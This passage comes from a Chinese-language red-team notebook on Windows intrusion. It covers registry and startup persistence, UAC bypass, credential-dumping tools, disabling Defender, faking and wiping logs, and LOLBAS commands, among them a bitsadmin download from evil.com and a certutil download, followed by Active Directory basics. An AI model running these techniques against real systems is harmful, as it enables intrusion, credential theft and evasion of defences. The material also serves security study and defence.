来创建隐藏用户，这种帐户可在一定条件下隐藏，但是仍可以通过控制面板查看。</span></p><p><span>在创建隐藏用户的基础上，可以修改注册表的方式创建影子用户，这种方式创建的用户只能通过注册表查看。</span></p></blockquote><h4 id='clr'><span>CLR</span></h4><blockquote><p><span>CLR (Common Language Runtime Compilation) 公共语言运行时，是微软为.NET 产品构建的运行环境，可以粗略地理解为.NET 虚拟机。</span></p><p><span>.NET 程序的运行离不开 CLR，因此可以通过劫持 CLR 的方式实现后门。</span></p></blockquote><h4 id='winlogon-helper-dll-后门'><span>Winlogon Helper DLL 后门</span></h4><blockquote><p><span>Winlogon 是一个 Windows 组件，用来处理各种活动，如登录、注销、身份验证期间加载用户配置文件、关闭、锁定屏幕等。这种行为由注册表管理，该注册表定义在 Windows 登录期间启动哪些进程。所以可以依靠这个注册表来进行权限维持。</span></p><p><span>注册表位置如下：</span></p></blockquote><ul><li><span>HKEY_LOCAL_MACHINE</span><span>\</span><span>SOFTWARE</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows NT</span><span>\</span><span>CurrentVersion</span><span>\</span><span>Winlogon</span><span>\</span><span>Shell 用于执行 exe 程序</span></li><li><span>HKEY_LOCAL_MACHINE</span><span>\</span><span>SOFTWARE</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows NT</span><span>\</span><span>CurrentVersion</span><span>\</span><span>Winlogon</span><span>\</span><span>Userinit 用于执行 exe 程序</span></li><li><span>HKEY_LOCAL_MACHINE</span><span>\</span><span>SOFTWARE</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows NT</span><span>\</span><span>CurrentVersion</span><span>\</span><span>Winlogon</span><span>\</span><span>Notify 用于执行 dll 文件</span></li></ul><h4 id='自启动-1'><span>自启动</span></h4><blockquote><p><strong><span>基于注册表的自启动</span></strong></p><p><span>通过在注册表中写入相应的键值可以实现程序的开机自启动，主要是 Run 和 RunOnce ，其中 RunOnce 和</span></p><p><span>Run 区别在于 RunOnce 的键值只作用一次，执行完毕后会自动删除。注册表如下：</span></p></blockquote><ul><li><span>HKEY_CURRENT_USER</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>Run</span></li><li><span>HKEY_CURRENT_USER</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>RunOnce</span></li><li><span>HKEY_LOCAL_MACHINE</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>Run</span></li><li><span>HKEY_LOCAL_MACHINE</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>RunOnce</span></li><li><span>HKEY_LOCAL_MACHINE</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>RunOnceEx</span></li></ul><blockquote><p><span>基于策略的自启动注册表设置如下：</span></p></blockquote><ul><li><span>HKEY_LOCAL_MACHINE</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>Policies</span><span>\</span><span>Explorer</span><span>\</span><span>Run</span></li><li><span>HKEY_CURRENT_USER</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>Policies</span><span>\</span><span>Explorer</span><span>\</span><span>Run</span></li></ul><blockquote><p><span>设置启动文件夹注册表位置如下：</span></p></blockquote><ul><li><span>HKEY_CURRENT_USER</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>Explorer</span><span>\</span><span>User Shell Folders</span></li><li><span>HKEY_CURRENT_USER</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>Explorer</span><span>\</span><span>Shell Folders</span></li><li><span>HKEY_LOCAL_MACHINE</span><span>\</span><span>SOFTWARE</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>Explorer</span><span>\</span><span>Shell Folders</span></li><li><span>HKEY_LOCAL_MACHINE</span><span>\</span><span>SOFTWARE</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>Explorer</span><span>\</span><span>User Shell Folders</span></li></ul><blockquote><p><span>设置服务启动项注册表位置如下：</span></p></blockquote><ul><li><span>HKEY_LOCAL_MACHINE</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>RunServicesOnce</span></li><li><span>HKEY_CURRENT_USER</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>RunServicesOnce</span></li><li><span>HKEY_LOCAL_MACHINE</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>RunServices</span></li><li><span>HKEY_CURRENT_USER</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>CurrentVersion</span><span>\</span><span>RunServices</span></li></ul><blockquote><p><span>用户自启动位置HKEY_LOCAL_MACHINE</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows NT</span><span>\</span><span>CurrentVersion</span><span>\</span><span>Winlogon</span><span>\</span><span>Userinit</span></p><p><span>、HKEY_LOCAL_MACHINE</span><span>\</span><span>Software</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows NT</span><span>\</span><span>CurrentVersion</span><span>\</span><span>Winlogon</span><span>\</span><span>Shell ， 其 中</span></p><p><span>Userinit 键允许指定用逗号分隔的多个程序。</span></p><p><span>如果用户启动了屏幕保护程序，也可以通过屏幕保护程序来启动后面，相关注册表键值为：</span></p></blockquote><ul><li><span>HKEY_CURRENT_USER</span><span>\</span><span>Control Panel</span><span>\</span><span>Desktop</span><span>\</span><span>ScreenSaveActive</span></li><li><span>HKEY_CURRENT_USER</span><span>\</span><span>Control Panel</span><span>\</span><span>Desktop</span><span>\</span><span>ScreenSaverIsSecure</span></li><li><span>HKEY_CURRENT_USER</span><span>\</span><span>Control Panel</span><span>\</span><span>Desktop</span><span>\</span><span>ScreenSaveTimeOut</span></li><li><span>HKEY_CURRENT_USER</span><span>\</span><span>Control Panel</span><span>\</span><span>Desktop</span><span>\</span><span>SCRNSAVE.EXE</span></li></ul><h4 id='基于特定目录的自启动'><span>基于特定目录的自启动</span></h4><blockquote><p><span>自启动目录，C:</span><span>\</span><span>Users</span><span>\</span><span>Username</span><span>\</span><span>AppData</span><span>\</span><span>Roaming</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>Start Menu</span><span>\</span><span>Programs</span><span>\</span><span>Startup目录对特定用户生效，C:</span><span>\</span><span>ProgramData</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>Start Menu</span><span>\</span><span>Programs</span><span>\</span><span>StartUp 对所有用户生效。在 NT6 以前，两个目录为 C:</span><span>\</span><span>Documents and Settings</span><span>\</span><span>Username</span><span>\</span><span>Start Menu</span><span>\</span><span>Programs</span><span>\</span><span>StartUp</span></p><p><span>/ C:</span><span>\</span><span>Documents and Settings</span><span>\</span><span>All Users</span><span>\</span><span>Start Menu</span><span>\</span><span>Programs</span><span>\</span><span>StartUp 。</span></p></blockquote><h3 id='权限'><span>权限</span></h3><h4 id='uac'><span>UAC</span></h4><blockquote><p><strong><span>简介</span></strong></p><p><span>UAC (User Account Control) 是 Windows Vista 和 Windows Server 2008 引入的一个安全机制，当一些敏感操作发生时，会跳出提示显式要求系统权限。</span></p><p><span>当用户登陆 Windows 时，每个用户都会被授予一个 access token，这个 token 中有 security identifier (SID)</span></p><p><span>的信息，决定了用户的权限。</span></p></blockquote><h4 id='会触发-uac-的操作'><span>会触发 UAC 的操作</span></h4><ul><li><span>以管理员权限启动应用</span></li><li><span>修改系统、UAC 设置</span></li><li><span>修改没有权限的文件或者目录（%SystemRoot% / %ProgramFiles% 等）</span></li><li><span>修改 ACL (access control list)</span></li><li><span>安装驱动</span></li><li><span>增删账户，修改账户类型，激活来宾账户</span></li></ul><h4 id='bypass-7'><span>ByPass</span></h4><ul><li><span>DLL 相关</span></li><li><span>进程注入</span></li><li><span>注册表</span></li></ul><h4 id='权限提升-1'><span>权限提升</span></h4><blockquote><p><span>权限提升有多重方式，有利用二进制漏洞、逻辑漏洞等技巧。利用二进制漏洞获取权限的方式是利用运行在内核态中的漏洞来执行代码。比如内核、驱动中的 UAF 或者其他类似的漏洞，以获得较高的权限。</span></p><p><span>逻辑漏洞主要是利用系统的一些逻辑存在问题的机制，比如有些文件夹用户可以写入，但是会以管理员权限启动。</span></p></blockquote><h4 id='任意写文件利用'><span>任意写文件利用</span></h4><blockquote><p><span>在 Windows 中用户可以写的敏感位置主要有以下这些</span></p></blockquote><ul><li><span>用户自身的文件和目录，包括 AppData Temp</span></li><li><span>C:</span><span>\</span><span> ，默认情况下用户可以写入</span></li><li><span>C:</span><span>\</span><span>ProgramData 的子目录，默认情况下用户可以创建文件夹、写入文件</span></li><li><span>C:</span><span>\</span><span>Windows</span><span>\</span><span>Temp 的子目录，默认情况下用户可以创建文件夹、写入文件具体的 ACL 信息可用 AccessChk, 或者 PowerShell 的 Get-Acl 命令查看。</span></li></ul><blockquote><p><span>可以利用对这些文件夹及其子目录的写权限，写入一些可能会被加载的 dll，利用 dll 的加载执行来获取权限。</span></p></blockquote><h4 id='mof'><span>MOF</span></h4><blockquote><p><span>MOF 是 Windows 系统的一个文件（c:/windows/system32/wbem/mof/nullevt.mof ）叫做</span>”<span> 托管对象格式</span>“<span>，其作用是每隔五秒就会去监控进程创建和死亡。</span></p><p><span>当拥有文件上传的权限但是没有 Shell 时，可以上传定制的 mof 文件至相应的位置，一定时间后这个 mof 就会被执行。</span></p><p><span>一般会采用在 mof 中加入一段添加管理员用户的命令的 vbs 脚本，当执行后就拥有了新的管理员账户。</span></p></blockquote><h4 id='凭证窃取'><span>凭证窃取</span></h4><ul><li><p><img src="media/image3.png" referrerpolicy="no-referrer"><strong><span>Windows 地密码散列导出工具</span></strong></p><ul><li><p><span>mimikatz</span></p></li><li><p><span>lsass</span></p></li><li><p><span>wce</span></p></li><li><p><span>gsecdump</span></p></li><li><p><span>copypwd</span></p></li><li><p><span>Pwdump</span></p></li><li><h4 id='procdump'><span>ProcDump</span></h4></li></ul></li></ul><blockquote><p><span>*</span><span> </span><a href='https://docs.microsoft.com/en-us/sysinternals/downloads/procdump' target='_blank' class='url'>https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</a></p></blockquote><ul><li><h4 id='mediaimage3pngwidth013194444444444445in-height013194444444444445inwindows-地密码破解工具'><img src="media/image3.png" referrerpolicy="no-referrer"><span>Windows 地密码破解工具</span></h4><ul><li><span>L0phtCrack</span></li><li><span>SAMInside</span></li><li><span>Ophcrack</span></li></ul></li><li><p><span>彩虹表破解</span></p></li><li><p><span>本机 hash+ 明文抓取</span></p></li><li><p><span>win8+win2012 明文抓取</span></p></li><li><p><span>ntds.dit 的导出 +QuarkPwDump 读取分析</span></p></li><li><p><span>vssown.vbs + libesedb + NtdsXtract</span></p></li><li><p><span>ntdsdump</span></p></li><li><p><span>利用 powershell(DSInternals) 分析 hash</span></p></li><li><p><span>使用 net use </span><span>\</span><span>\</span><span>%computername% /u:%username% 重置密码尝试次数</span></p></li><li><p><span>限制读取时，可 crash 操作系统后，在蓝屏的 dump 文件中读取</span></p></li></ul><h4 id='其他-4'><span>其他</span></h4><ul><li><p><span>组策略首选项漏洞</span></p></li><li><p><span>DLL 劫持</span></p></li><li><p><span>替换系统工具，实现后门</span></p></li><li><h4 id='关闭-defender'><span>关闭 defender</span></h4><ul><li><p><span>Set-MpPreference -disablerealtimeMonitoring </span><span>$</span><span>true</span></p><ol start='' ><li><h3 id='痕迹清理-1'><span>痕迹清理</span></h3></li></ol></li></ul></li></ul><h4 id='日志-1'><span>日志</span></h4><ul><li><p><span>查看日志 eventvwr</span></p></li><li><p><span>伪造日志 eventcreate</span></p></li><li><h4 id='操作日志'><span>操作日志</span></h4><ul><li><span>3389 登录列表</span></li><li><span>文件打开日志</span></li><li><span>文件修改日志</span></li><li><span>浏览器日志</span></li><li><span>系统事件</span></li><li><span>程序安装记录</span></li><li><span>程序删除记录</span></li><li><span>程序更新记录</span></li></ul></li><li><h4 id='登录日志'><span>登录日志</span></h4><ul><li><span>系统安全日志</span></li></ul></li><li><h4 id='日志路径'><span>日志路径</span></h4><ul><li><span>系统日志 %SystemRoot%</span><span>\</span><span>System32</span><span>\</span><span>Winevt</span><span>\</span><span>Logs</span><span>\</span><span>System.evtx</span></li><li><span>安全日志 %SystemRoot%</span><span>\</span><span>System32</span><span>\</span><span>Winevt</span><span>\</span><span>Logs</span><span>\</span><span>Security.evtx</span></li><li><span>应用程序日志 %SystemRoot%</span><span>\</span><span>System32</span><span>\</span><span>Winevt</span><span>\</span><span>Logs</span><span>\</span><span>Application.evtx</span></li></ul></li><li><h4 id='服务日志'><span>服务日志</span></h4><ul><li><span>IIS %SystemDrive%</span><span>\</span><span>inetpub</span><span>\</span><span>logs</span><span>\</span><span>LogFiles</span><span>\</span><span>W3SVC1</span><span>\</span></li></ul></li></ul><h4 id='注册表'><span>注册表</span></h4><ul><li><span>AppCompatFlags</span></li><li><span>Background Activity Moderator (BAM)</span></li><li><span>MuiCache</span></li><li><span>RecentApps</span></li><li><span>RunMRU</span></li><li><span>ShimCache (AppCompatCache)</span></li></ul><h4 id='注册表键'><span>注册表键</span></h4><ul><li><span>HKEY_LOCAL_MACHINEsystemCurrentControlSetServicesEventlog</span></li></ul><h4 id='文件-1'><span>文件</span></h4><blockquote><p><strong><span>Prefetch</span></strong></p><p><span>预读取文件夹，用来存放系统已访问过的文件的预读信息，扩展名为 PF。位置在 C:</span><span>\</span><span>Windows</span><span>\</span><span>Prefetch 。</span></p></blockquote><h4 id='jumplists'><span>JumpLists</span></h4><blockquote><p><span>记 录 用 户 最 近 使 用 的 文 档 和 应 用 程 序， 方 便 用 户 快 速 跳 转 到 指 定 文 件， 位 置 在</span></p><p><span>%APPDATA%</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows</span><span>\</span><span>Recent 。</span></p></blockquote><h4 id='amcache--recentfilecachebcf'><span>Amcache / RecentFileCache.bcf</span></h4><blockquote><p><span>Windows 中的使用这两个文件来跟踪具有不同可执行文件的应用程序兼容性问题，它可用于确定可执行文件首次运行的时间和最后修改时间。</span></p><p><span>在 Windows 7、Windows Server 2008 R2 等 系 统 中， 文 件 保 存 在 C:</span><span>\</span><span>Windows</span><span>\</span><span>AppCompat</span><span>\</span><span>Programs</span><span>\</span><span>RecentFileCache.bcf ， 包含程序的创建时间、 上次修改时间、上次访问时间和文件名。</span></p><p><span>在 Windows 8、Windows 10、Windows Server 2012 等 系 统 中， 文 件 保 存 在 C:</span><span>\</span><span>Windows</span><span>\</span><span>AppCompat</span><span>\</span><span>Programs</span><span>\</span><span>Amcache.hve ， 包含文件大小、版本、sha1、二进制文件类型等信息。</span></p></blockquote><h4 id='时间轴'><span>时间轴</span></h4><blockquote><p><span>Windows 时间轴是 Windows 10 在 1803 版中引入的一个新特性，会记录访问过的网站、编辑过的文档、运行的程序等，</span></p></blockquote><h4 id='彻底删除'><span>彻底删除</span></h4><ul><li><span>多次覆写文件 cipher /w:</span><span>&lt;</span><span>path</span><span>&gt;</span></li><li><span>格式化某磁盘 count 次 format D: /P:</span><span>&lt;</span><span>count</span><span>&gt;</span></li></ul><h3 id='横向移动-1'><span>横向移动</span></h3><h4 id='常见入口'><span>常见入口</span></h4><ul><li><span>SMB 弱密码</span></li><li><span>SqlServer 弱密码</span></li></ul><h4 id='lolbas'><span>LOLBAS</span></h4><blockquote><p><strong><span>简介</span></strong></p><p><span>LOLBAS，全称 Living Off The Land Binaries and Scripts (and also Libraries)，是一种白利用方式，是在 2013 年 DerbyCon 由 Christopher Campbell 和 Matt Graeber 发现，最终 Philip Goh 提出的概念。</span></p><p><span>这些程序一般有有 Microsoft 或第三方认证机构的签名，但是除了可以完成正常的功能，也能够被用于内网渗透中。这些程序可能会被用于：下载安全恶意程序、执行恶意代码、绕过 UAC、绕过程序控制等。</span></p></blockquote><h4 id='常见程序'><span>常见程序</span></h4><ul><li><p><strong><span>appsyncvpublishing.exe</span></strong></p><ul><li><span>执行 powershell</span></li></ul></li><li><h4 id='bitsadminexe'><span>bitsadmin.exe</span></h4><ul><li><span>下载文件 bitsadmin /transfer </span><span>&lt;</span><span>job_name</span><span>&gt;</span><span> /priority </span><span>&lt;</span><span>priority</span><span>&gt;</span><span> </span><span>&lt;</span><span>remote_path</span><span>&gt;</span></li></ul></li></ul><blockquote><p><span>&lt;</span><span>local_path</span><span>&gt;</span></p></blockquote><ul><li><span>下载文件 bitsadmin /create 1 bitsadmin /addfile 1 </span><a href='https://evil.com/autoruns' target='_blank' class='url'>https://evil.com/autoruns</a><span>. exe c:</span><span>\</span><span>data</span><span>\</span><span>playfolder</span><span>\</span><span>autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1</span></li><li><span>复制文件 bitsadmin /create 1 &amp; bitsadmin /addfile 1 c:</span><span>\</span><span>windows</span><span>\</span><span>system32</span><span>\</span><span>cmd. exe c:</span><span>\</span><span>data</span><span>\</span><span>playfolder</span><span>\</span><span>cmd.exe &amp; bitsadmin /RESUME 1 &amp; bitsadmin /Complete</span></li></ul><blockquote><p><span>1 &amp; bitsadmin /reset</span></p></blockquote><ul><li><span>代码执行 bitsadmin /create 1 &amp; bitsadmin /addfile 1 c:</span><span>\</span><span>windows</span><span>\</span><span>system32</span><span>\</span><span>cmd. exe c:</span><span>\</span><span>data</span><span>\</span><span>playfolder</span><span>\</span><span>cmd.exe &amp; bitsadmin /SetNotifyCmdLine 1 c:</span><span>\</span><span>data</span><span>\</span><span>playfolder</span><span>\</span><span>cmd.exe NULL &amp; bitsadmin /RESUME 1 &amp; bitsadmin /Reset</span></li></ul><blockquote><p><span>• cdb.exe</span></p></blockquote><h4 id='-certutilexe'><span>• certutil.exe</span></h4><blockquote><p><strong>–</strong><span> 可安装、备份、删除、管理和执行证书</span></p><p><strong>–</strong><span> 证书存储相关功能</span></p><p><span>• cmd.exe</span></p></blockquote><ul><li><p><span>下载文件 certutil -urlcache -split -f </span><a href='https://addr/example.exe' target='_blank' class='url'>https://addr/example.exe</a></p></li><li><p><span>注意 certutil 是有 cache 的，需要显式删除</span></p></li><li><p><span>base64 编解码 certutil -encode / certutil -decode</span></p><ul><li><p><span>cmstp.exe</span></p></li><li><h4 id='controlexe'><span>control.exe</span></h4><ul><li><a href='https://www.dearbytes.com/blog/playing-around-with-nsa-hacking-tools/'><span>加载 dll</span></a></li></ul></li><li><h4 id='cscexe'><span>csc.exe</span></h4><ul><li><span>编译 C# 载荷</span></li></ul></li><li><h4 id='cscriptexe'><span>cscript.exe</span></h4><ul><li><span>执行脚本</span></li></ul></li><li><p><span>extexport.exe</span></p></li><li><h4 id='expandexe'><span>expand.exe</span></h4><ul><li><span>展开一个或多个压缩文件</span></li></ul></li><li><h4 id='forfilesexe'><span>forfiles.exe</span></h4><ul><li><span>forfiles /p c:</span><span>\</span><span>windows</span><span>\</span><span>system32 /m notepad.exe /c calc.exe</span></li></ul></li><li><p><span>mofcomp.exe</span></p></li><li><p><span>makecab.exe</span></p></li><li><h4 id='msbuildexe'><span>msbuild.exe</span></h4><ul><li><span>构建应用程序</span></li></ul></li><li><h4 id='mshtaexe'><span>mshta.exe</span></h4><ul><li><span>HTML 应用</span></li></ul></li><li><h4 id='msiexecexe'><span>msiexec.exe</span></h4><ul><li><span>安装 msi</span></li><li><span>加载 dll</span></li></ul></li><li><h4 id='msxslexe'><span>msxsl.exe</span></h4><ul><li><span>处理 XSL 程序</span></li></ul></li><li><p><span>netsh.exe</span></p></li><li><h4 id='installutilexe'><span>installutil.exe</span></h4><ul><li><span>安装/卸载程序组件</span></li></ul></li><li><h4 id='ieexecexe'><span>IEExec.exe</span></h4><ul><li><span>.NET Framework 附带程序</span></li></ul></li><li><p><span>powershell.exe</span></p></li><li><h4 id='psexecexe'><span>psexec.exe</span></h4><ul><li><a href='https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec' target='_blank' class='url'>https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></li></ul></li><li><h4 id='regexe'><span>reg.exe</span></h4><ul><li><span>注册表控制台</span></li></ul></li><li><h4 id='regeditexe'><span>regedit.exe</span></h4><ul><li><span>注册表修改</span></li></ul></li><li><h4 id='regsvr32exe'><span>regsvr32.exe</span></h4><ul><li><span>注册动态链接库/ActiveX 控件</span></li></ul></li><li><h4 id='rundll32exe'><span>rundll32.exe</span></h4><ul><li><span>执行 DLL 文件中的内部函数</span></li></ul></li><li><h4 id='scexe'><span>sc.exe</span></h4><ul><li><span>查看服务状态管理</span></li></ul></li><li><h4 id='schtasksexe'><span>schtasks.exe</span></h4><ul><li><span>定时计划任务</span></li></ul></li><li><h4 id='shred'><span>shred</span></h4><ul><li><span>重复写入文件，防止文件恢复</span></li></ul></li><li><h4 id='typeexe'><span>type.exe</span></h4><ul><li><span>利用 ads 隐藏文件 type </span><span>&lt;</span><span>filepath</span><span>&gt;</span><span> </span><span>&lt;</span><span>target_file:ads</span><span>&gt;</span></li></ul></li><li><h4 id='wmicexe'><span>wmic.exe</span></h4><ul><li><span>Windows 管理工具</span></li></ul></li><li><p><span>windbg.exe</span></p></li><li><p><span>winrm.exe</span></p></li><li><h4 id='wscriptexe'><span>wscript.exe</span></h4><ul><li><span>脚本引擎</span></li></ul></li><li><h4 id='waitforexe'><span>waitfor.exe</span></h4><ul><li><span>用于同步网络中计算机，可以发送或等待系统上的信号。</span></li></ul><ol start='' ><li><h3 id='域渗透-1'><span>域渗透</span></h3></li></ol></li></ul></li></ul><h4 id='用户-1'><span>用户</span></h4><blockquote><p><strong><span>用户组与工作组用户</span></strong></p><p><span>Windows 系统存在一些为了特定用途而设置的用户，分别是：SYSTEM(系统)、Trustedinstaller(信任程序模块)、Everyone(所有人)、Creator Owner(创建者) 等，这些特殊用户不属于任何用户组，是完全独立的账户。其中 SYSTEM 拥有整台计算机管理权限的账户，一般操作无法获取与它等价的权限。</span></p></blockquote><h4 id='用户组'><span>用户组</span></h4><blockquote><p><span>Windows 系统内置了许多本地用户组，用于管理用户权限。只要用户账户加入到对应的用户组内，则用户账户也将具备对应用户组所拥有的权限。</span></p><p><span>默认情况下，系统为用户分了 7 个组，并给每个组赋予不同的操作权限。这些组为：管理员组 (Administrators)、高权限用户组(Power Users)、普通用户组 (Users)、备份操作组 (Backup Operators)、文件复制组 (Replicator)、来宾用户组 (Guests)、身份验证用户组 (Authenticated Users)。</span></p></blockquote><h4 id='工作组'><span>工作组</span></h4><blockquote><p><span>工作组（Workgroup）是最常用最简单最普遍的资源管理模式，默认情况下计算机都在名为 workgroup 的工作组中。工作组模式比较松散，适合网络中计算机数量较少，不需要严格管理的情况。</span></p></blockquote><h4 id='域中用户域用户'><span>域中用户域用户</span></h4><blockquote><p><span>域环境中的用户和本地用户的帐户不同，域用户帐户保存在活动目录中。在域环境中，一个域用户可以在域中的任何一台计算机上登录。在域中用户可以使用 SID (Security Identifier) 来表明身份，用 NTLM 哈希或者 Kerberos 来验证身份。</span></p></blockquote><h4 id='机器用户'><span>机器用户</span></h4><blockquote><p><span>机器用户也被称作机器账号或计算机账号，所有加入域的主机都会有一个机器用户，机器用户的用户名以 </span><span>$</span></p><p><span>结尾。</span></p></blockquote><h4 id='组策略'><span>组策略</span></h4><blockquote><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>组策略 (Group Policy) 用于控制用户帐户和计算机帐户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。其中本地的组策略 (LGPO 或 LocalGPO)，可以在独立 非域的计算机上管理组策略对象。在域环境中的组策略通常被称作 GPO(Group Policy Object)。</span></p></blockquote><h4 id='内网常用协议'><span>内网常用协议</span></h4><blockquote><p><span>Windows 查询名称解析的顺序为 DNS、mDNS、LLMNR、NBNS。</span></p></blockquote><h4 id='netbios'><span>NetBIOS</span></h4><blockquote><p><span>NetBIOS（Network Basic Input/Output System）是基于网络的交互协议，通常使用 UDP 137、UDP 138、 TCP 139 等端口。Windows 在安装 TCP/IP 协议时会默认启用该协议，可能导致未设置权限校验的网络资源被访问。</span></p><p><span>基于 NetBIOS 有 NBNS (NetBIOS Name Service) 服务，通常监听在 UDP 137 端口，该服务提供三种功能：将 NetBIOS 名称解析到 IP、查询某一个 NetBIOS 节点的状态，注册/释放一个 NetBIOS 名。</span></p><p><span>可以使用 nbtstat 工具利用 NetBIOS 协议管理网络。</span></p></blockquote><h4 id='llmnr'><span>LLMNR</span></h4><blockquote><p><span>链路本地多播名称解析 (Link-Local Multicast Name Resolution, LLMNR) 是一个基于 DNS 数据包格式的协议，IPv4 和 IPv6 的主机可以通过此协议对同一本地链路上的主机执行名称解析。该协议在 Windows Vista后被引入。LLMNR 监听 UDP 5355 端口，可以通过多播地址 224.0.0.252 (或 FF02:0:0:0:0:0:1:3) 访问。</span></p></blockquote><h4 id='mdns-2'><span>mDNS</span></h4><blockquote><p><span>mDNS (multicast DNS) 在 Windows 10 中被引入，监听 UDP 5353 端口，对应的多播地址为 224.0.0.251 (</span></p><p><span>FF02::FB ) 。mDNS 主要实现了在没有传统 DNS 服务器的情况下使局域网内的主机实现相互发现和通信。</span></p></blockquote><h4 id='wpad'><span>WPAD</span></h4><blockquote><p><span>网络代理自动发现协议 (Web Proxy Auto-Discovery, WPAD) 是一种客户端使用 DHCP 和/或 DNS 发现方法来定位一个配置文件 URL 的方法。在检测和下载配置文件后，它可以执行配置文件以测定特定 URL 应使用的代理。</span></p></blockquote><h4 id='域-1'><span>域</span></h4><blockquote><p><span>域指将网络中多台计算机逻辑上组织到一起，进行集中管理的逻辑环境。域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。</span></p></blockquote><h4 id='域结构域树'><span>域结构域树</span></h4><blockquote><p><span>域树（Trees）由多个域组成，这些域共享同一表结构和配置，形成一个连续的命名空间（namespace）。</span></p></blockquote><h4 id='林'><span>林</span></h4><blockquote><p><span>林（Forests）是一个复杂的 AD 实例，由一个或数个域组成，每个域树都有自己唯一的名称空间。</span></p></blockquote><h4 id='域控制器'><span>域控制器</span></h4><blockquote><p><span>ADDS 的目录存储在域控制器 (Domain Controller) 内，一个域内可以有多台域控制器，每一个域控制器的地位几乎是平等的，有几乎相同的数据库。</span></p><p><span>在一台域控制器添加一个用户账户后，这个账户会被自动复制到其他域控制器的数据库中。</span></p><p><span>AD 数据库有多主机复制模式（Multi-master Replication Model）和单主机复制模式（Sing-master Replication Model）。</span></p><p><span>多主机模式可以直接更新任何一台域控制器内的 AD 对象，并将更新之后的对象复制到其他域控制器，大部分数据都是用多主机模式进行复制。</span></p><p><span>单主机复制模式是指由一台被称作操作主机（Operations Master）的域控制器负责接收更改数据的请求，并将数据复制到其他的域控制器。</span></p></blockquote><h4 id='信任'><span>信任</span></h4><blockquote><p><span>两个域之间需要创建信任关系，才可以访问对应域内的资源。</span></p></blockquote><h4 id='域信任类型'><span>域信任类型</span></h4><blockquote><p><span>Active Directory 的信任方式可以分为以下几种：</span></p></blockquote><ul><li><h4 id='tree-root-trust'><span>Tree-Root Trust</span></h4><ul><li><span>双向具有转移性</span></li></ul></li><li><h4 id='parent-child-trust'><span>Parent-Child Trust</span></h4><ul><li><span>具有转移性，双向行人</span></li></ul></li><li><h4 id='forest-trust'><span>Forest Trust</span></h4><ul><li><span>如果两个林创建了信任关系，则林中所有的域都相互信任</span></li><li><span>两个林之间的信任关系无法自动扩展到其他林上</span></li></ul></li><li><h4 id='realm-trust'><span>Realm Trust</span></h4><ul><li><span>ADDS 域可以和非 Windows 系统的 Kerberos 域之间创建信任</span></li></ul></li><li><h4 id='external-trust'><span>External Trust</span></h4><ul><li><span>位于两个林内的域之间可以通过外部信任来创建信任关系</span></li></ul></li><li><h4 id='shortcut-trust'><span>Shortcut Trust</span></h4><ul><li><span>可以缩短验证用户身份的时间</span></li></ul></li></ul><h4 id='ou'><span>OU</span></h4><blockquote><p><span>组织单位（Organization Unit，OU）是一个容器对象，将域中的对象组织成逻辑组，帮助管理员管理。OU</span></p><p><span>包含用户、计算机、工作组、打印机、安全策略以及其他组织单位等。</span></p></blockquote><h4 id='active-directory'><span>Active Directory</span></h4><blockquote><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>活动目录（Active Directory，AD)是面向 Windows Server 的目录服务。Active Directory 存储了有关网络对象的信息，并 让管理员和用户能够查找和使用这些信息。</span></p></blockquote><h4 id='adds'><span>ADDS</span></h4><blockquote><p><span>Active Directory 提供目录服务的组件被称作 Active Directory 域服务（Active Directory Domain Services,</span></p><p><span>ADDS），负责目录数据库的存储、增删改查等工作，可以用在多种局域网、广域网的场景中。</span></p><p><span>从逻辑上看，ADDS 的组件可以分为 Partition、Schema、Domain、Domain tree、Forest、OU、Container。 Partition 也被称为 naming context，是 AD DS 数据库的一部分。Schema 是存储在 ADDS 中数据的定义。</span></p><p><span>Container 是为 ADDS 